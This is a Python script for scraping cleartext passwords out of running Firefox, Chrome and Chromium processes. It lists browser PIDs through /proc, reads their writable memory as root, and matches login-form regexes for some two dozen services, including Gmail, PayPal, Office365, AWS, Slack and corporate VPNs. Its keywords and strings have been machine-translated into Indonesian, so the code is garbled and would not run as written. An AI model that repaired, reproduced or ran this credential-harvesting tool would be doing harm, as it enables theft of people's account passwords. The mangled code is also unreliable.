# ! / usr / bin / env python

impor ulang, sys, os
dari check_output impor subprocess
"" "
Memori pencarian Firefox, Chrome dan Chromium untuk kata sandi cleartext
"" "

patterns = {
    ' AnubisLabs ' : ' username =. {1,42} & password =. {1,22} & login = login ' ,
    ' BugZilla ' : ' Bugzilla_login =. {1,50} & Bugzilla_password =. {1,50} ' ,
    ' CitrixNetScaler ' : ' login =. {1,22} & passwd =. {1,42} ' ,
    ' CitrixOnline ' : ' emailAddress =. {1,50} & kata sandi =. {1,50} & kirimkan ' ,
    ' Cpanel ' : ' user =. {1,50} & pass =. {1,50} ' ,
    ' Dropbox ' : ' login_email =. {1,99} & login_password =. {1,99} & ' ,
    ' Facebook ' : ' lsd =. {1,10} & email =. {1,42} & pass =. {1,22} & default_persistent = ' ,
    ' Github ' : ' % 3D% 3D & login =. {1,50} & kata sandi =. {1,50} ' ,
    ' Gmail ' : ' & Email =. {1,99}? & Passwd =. {1,99}? & PersistentCookie = ' ,
    ' JIRA ' : ' nama pengguna =. {1,50} & kata sandi =. {1,50} & ingatKu ' ,
    ' JuniperSSLVPN ' : ' tz_offset = -. {1,6} & username =. {1,22} & password =. {1,22} & dunia =. {1,22} & btnSubmit = ' ,
    ' LinkedIN ' : ' session_key =. {1,50} & session_password =. {1,50} & isJsEnabled ' ,
    ' MYOB ' : ' UserName =. {1,50} & Sandi =. {1,50} & RememberMe = ' ,
    ' Malwr ' : ' & username =. {1,32} & kata sandi =. {1,22} & selanjutnya = ' ,
    ' MicrosoftOneDrive ' : ' login =. {1,42} & passwd =. {1,22} & ketik =. {1,2} & PPFT = ' ,
    ' Office365 ' : ' login =. {1,32} & passwd =. {1,22} & PPSX = ' ,
    ' OutlookWeb ' : ' & username =. {1,48} & password =. {1,48} & passwordText ' ,
    ' PayPal ' : ' login_email =. {1,48} & login_password =. {1,16} & submit = Log \\ + Dalam & browser_name ' ,
    ' RDPWeb ' : ' DomainUserName =. {1,52} & UserPass =. {1,42} & MachineType ' ,
    ' Redmine ' : ' username =. {1,50} & password =. {1,50} & login = Login ' ,
    ' SalesForce ' : ' & display = page & username =. {1,32} & pw =. {1,16} & Login = ' ,
    ' Slack ' : ' & crumb =. {1,70} & email =. {1,50} & kata sandi =. {1,48} ' ,
    ' Twitter ' : ' username_or_email% 5D =. {1,42} & sesi% 5Bpassword% 5D =. {1,22} & ingat_me = ' ,
    ' VirusTotal ' : ' password =. {1,22} & username =. {1,42} & selanjutnya = % 2F en % 2F & response_format = json ' ,
    ' Xero ' : ' fragment = & userName =. {1,32} & kata sandi =. {1,22} & __ RequestVerificationToken = ' ,
    ' Zendesk ' : ' pengguna% 5Bemail% 5D =. {1,50} & pengguna% 5Bpassword% 5D =. {1,50} ' ,
    ' awsWebServices ' : ' & email =. {1,48} & buat =. {1,2} & kata sandi =. {1,22} & metadata1 = '
}

regexes = {}

untuk kunci dalam pola:
    regexes [key] = re.compile (pola [kunci])


def  get_browser_pids ():
    "" "
    dapatkan semua bagian dari masing-masing browser
    "" "
    pids = [pid untuk pid di os.listdir ( ' / proc ' ) jika pid.isdigit ()]
    browsers = {}
    untuk pid di pids:
        coba :
            proses =  terbuka (os.path.join ( ' / proc ' , pid, ' cmdline ' ), ' rb ' ) .Baca ()
            pid =  int (pid)
            jika  " chromium "  dalam proses.lower ():
                jika  " chromium "  tidak  di browser:
                    browser [ " chromium " ] = [pid]
                lain :
                    browser [ " chromium " ] .append (pid)
            elif  " firefox "  dalam proses.lower ():
                jika  " firefox "  tidak ada  di browser:
                    browser [ " firefox " ] = [pid]
                lain :
                    browser [ " firefox " ] .append (pid)
            elif  " chrome "  dalam proses.lower ():
                jika  " chrome "  tidak  di browser:
                    browser [ " chrome " ] = [pid]
                lain :
                    browser [ " chrome " ] .append (pid)
        kecuali  IOError :
            terus
    kembali browser

def  get_matches_of_pid ( pid , only_writable = True ):
    "" " 
    Jalankan sebagai root, ambil PID integer dan kembalikan kecocokan dari memori pids itu
    "" "
    memory_permissions =  ' rw '  jika only_writable else  ' r- '
    print ( " PID = % d "  % pid)
    mem_contents =  " "
    dengan  terbuka ( " / proc / % d / maps "  % pid, ' r ' ) sebagai maps_file:
        dengan  open ( " / proc / % d / mem "  % pid, ' r ' , 0 ) sebagai mem_file:
            untuk baris dalam maps_file.readlines ():   # untuk setiap wilayah yang dipetakan
                m = re.match ( r ' ( [ 0-9A-Fa-f ] + ) - ( [ 0-9A-Fa-f ] + )  ( [ -r ] [ -w ] ) ' , garis)
                jika m.group ( 3 ) == memory_permissions:
                    start =  int (m.group ( 1 ), 16 )
                    jika mulai >  0x FFFFFFFFFFFF :
                        terus
                    end =  int (m.group ( 2 ), 16 )
                    mem_file.seek (mulai)   # mencari wilayah mulai
                    chunk = mem_file.read (end - start)   # membaca isi wilayah
                    mem_contents + = chunk
                lain :
                    lulus
    pertandingan = {}
    untuk layanan dalam regexe:
        match = regexes [service] .findall ( str (mem_contents))
        jika cocok:
            cocok [layanan] = cocok
    kembali pertandingan

jika  __name__  ==  ' __main__ ' :
    browsers = get_browser_pids ()
    untuk peramban di browser:
        print  " Ditemukan % s berjalan, proses pemindaian .... "  % browser
        untuk pid di browser [browser]:
            coba :
                cocok = get_matches_of_pid (pid)
            kecuali  IOError :
                terus
        untuk layanan dalam pertandingan:
            cetak "menemukan layanan% s:% s"% (layanan, cocok dengan [layanan])
